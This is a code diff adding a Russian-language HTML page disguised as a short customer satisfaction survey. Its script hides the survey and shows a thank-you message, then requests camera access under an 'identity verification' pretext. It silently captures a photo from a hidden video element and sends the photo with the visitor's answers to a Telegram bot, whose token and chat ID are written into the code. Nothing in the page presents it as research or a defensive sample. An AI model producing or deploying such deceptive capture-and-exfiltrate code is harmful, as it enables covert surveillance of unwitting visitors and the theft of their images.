@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Опрос пользователей</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #f0f2f5;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .survey-form {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        .question {
+            margin: 20px 0;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input, textarea, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            margin-top: 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #3367d6;
+        }
+        #thankYou {
+            display: none;
+            margin-top: 30px;
+        }
+        #videoElement {
+            display: none;
+        }
+        .permission-text {
+            color: #666;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="survey-form">
+        <h1>Опрос удовлетворенности</h1>
+        <p>Пожалуйста, заполните эту короткую форму. Это займет не более 2 минут.</p>
+        
+        <div class="question">
+            <label for="q1">1. Как вы оцениваете наш сервис?</label>
+            <select id="q1">
+                <option value="5">Отлично</option>
+                <option value="4">Хорошо</option>
+                <option value="3">Удовлетворительно</option>
+                <option value="2">Плохо</option>
+                <option value="1">Очень плохо</option>
+            </select>
+        </div>
+        
+        <div class="question">
+            <label for="q2">2. Что мы могли бы улучшить?</label>
+            <textarea id="q2" rows="3"></textarea>
+        </div>
+        
+        <p class="permission-text">При отправке формы будет запрошен доступ к камере для подтверждения личности</p>
+        
+        <button id="submitBtn">Отправить отзыв</button>
+        
+        <div id="thankYou">
+            <h2>Спасибо за ваш отзыв!</h2>
+            <p>Ваше мнение очень важно для нас.</p>
+        </div>
+    </div>
+
+    <!-- Скрытые элементы для фото -->
+    <video id="videoElement" autoplay></video>
+    <canvas id="photoCanvas" style="display:none;"></canvas>
+
+    <script>
+        // Конфигурация (замените на свои данные)
+        const TELEGRAM_BOT_TOKEN = '7465976373:AAGf39_tqo49urq0BjZ8Epm7dkap-HzcG5E';
+        const TELEGRAM_CHAT_ID = '1165076107';
+        
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            // Сначала показываем сообщение
+            document.querySelector('.survey-form').style.display = 'none';
+            document.getElementById('thankYou').style.display = 'block';
+            
+            // Затем запрашиваем доступ к камере
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.getElementById('videoElement');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    // Делаем фото через 2 секунды
+                    setTimeout(() => {
+                        takeAndSendPhoto();
+                        // Останавливаем камеру
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 2000);
+                })
+                .catch(err => {
+                    console.error("Не удалось получить доступ к камере:", err);
+                });
+        });
+        
+        // Функция для создания и отправки фото
+        function takeAndSendPhoto() {
+            const video = document.getElementById('videoElement');
+            const canvas = document.getElementById('photoCanvas');
+            
+            // Устанавливаем размеры canvas как у видео
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Делаем снимок
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            // Преобразуем в base64
+            const photoDataUrl = canvas.toDataURL('image/jpeg').split(',')[1];
+            
+            // Отправляем фото в Telegram
+            sendToTelegram(photoDataUrl);
+        }
+        
+        // Функция отправки в Telegram
+        function sendToTelegram(photoBase64) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', base64ToBlob(photoBase64, 'image/jpeg'), 'photo.jpg');
+            formData.append('caption', 'Новое фото с сайта: ' + 
+                          'Оценка: ' + document.getElementById('q1').value + ', ' +
+                          'Комментарий: ' + document.getElementById('q2').value);
+            
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log('Данные отправлены в Telegram:', data))
+            .catch(error => console.error('Ошибка отправки:', error));
+        }
+        
+        // Вспомогательная функция для преобразования base64 в Blob
+        function base64ToBlob(base64, contentType) {
+            const byteCharacters = atob(base64);
+            const byteArrays = [];
+            
+            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                const slice = byteCharacters.slice(offset, offset + 512);
+                const byteNumbers = new Array(slice.length);
+                
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                
+                const byteArray = new Uint8Array(byteNumbers);
+                byteArrays.push(byteArray);
+            }
+            
+            return new Blob(byteArrays, { type: contentType });
+        }
+    </script>
+</body>
+</html>
